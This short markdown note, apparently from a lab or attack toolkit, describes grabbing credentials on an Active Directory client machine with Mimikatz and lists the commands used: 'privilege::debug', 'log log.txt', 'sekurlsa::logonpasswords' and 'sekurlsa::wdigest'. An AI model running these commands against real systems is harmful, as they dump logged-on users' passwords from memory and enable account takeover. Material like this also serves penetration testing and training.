# Credential Grabbing in Active Directory

**NOTE: This is only to be used in an Active Directory environment on the Client machine. Please make sure you have selected the proper machine prior to running this attack.**

This attack uses Mimikatz to grab credentials via the command line. The Mimikatz commands are: "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest".